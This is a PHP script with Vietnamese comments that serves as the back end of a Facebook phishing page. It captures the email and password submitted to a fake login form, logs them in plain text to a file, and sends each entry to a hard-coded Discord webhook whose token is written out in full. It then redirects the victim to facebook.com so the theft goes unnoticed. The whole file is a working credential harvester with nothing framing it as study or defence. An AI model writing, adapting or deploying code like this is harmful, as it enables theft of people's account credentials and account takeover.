<?php
ob_start(); // Bắt đầu buffer để tránh lỗi header

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Đường dẫn thư mục và file
    $dir_path = "data";
    $file_path = "$dir_path/logins.txt";

    // Kiểm tra và tạo thư mục nếu chưa tồn tại
    if (!is_dir($dir_path)) {
        mkdir($dir_path, 0777, true);
    }

    // Kiểm tra nếu file chưa tồn tại thì tạo mới
    if (!file_exists($file_path)) {
        file_put_contents($file_path, "=== Login Logs ===\n", FILE_APPEND);
    }

    if (!empty($email) && !empty($password)) {
        $log_entry = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";

        // Ghi tiếp dữ liệu vào file mà không xóa dữ liệu cũ
        file_put_contents($file_path, $log_entry, FILE_APPEND | LOCK_EX);

        // Gửi dữ liệu lên Discord Webhook
        sendToDiscord($log_entry);
    }

    // Điều hướng đến Facebook
    header("Location: https://www.facebook.com");
    exit();
}

ob_end_flush(); // Kết thúc buffer

// Hàm gửi dữ liệu lên Discord Webhook
function sendToDiscord($message) {
    $webhook_url = "https://discordapp.com/api/webhooks/1353342049876709446/75SX0g7Eo33o4-9WESMVmW9ak8PYgBPb6wpzw31fPczWl08gynHt5nB2yDVJpYjFDf0k"; // Thay YOUR_WEBHOOK_URL bằng webhook thật của bạn

    $data = [
        "content" => "📝 **Login Attempt**\n```$message```"
    ];

    $options = [
        "http" => [
            "header"  => "Content-Type: application/json",
            "method"  => "POST",
            "content" => json_encode($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);
}
?>
